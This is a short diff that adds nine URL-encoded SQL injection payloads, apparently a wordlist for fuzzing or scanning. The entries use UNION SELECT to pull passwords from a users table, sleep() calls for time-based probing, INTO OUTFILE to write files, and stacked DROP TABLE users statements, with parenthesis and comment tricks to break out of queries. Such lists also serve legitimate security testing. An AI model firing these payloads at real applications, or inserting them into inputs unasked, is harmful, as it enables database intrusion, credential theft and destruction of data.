@@ -1,0 +1,9 @@
+‘-sqlite_version()%20UNION%20SELECT%20password%20FROM%20users-%20-
+sleep(9999)
+)-sleep(9999
+1337%20INTO%20OUTFILE%20‘xxx’--
+1337)%20INTO%20OUTFILE%20‘xxx’--
+123;DROP%20TABLE%20users--
+123);DROP%20TABLE%20users--
+)%20OR%20(SELECT%20password%20FROM%20users%20...
+*/UNION%20SELECT%20password%20FROM%20users--
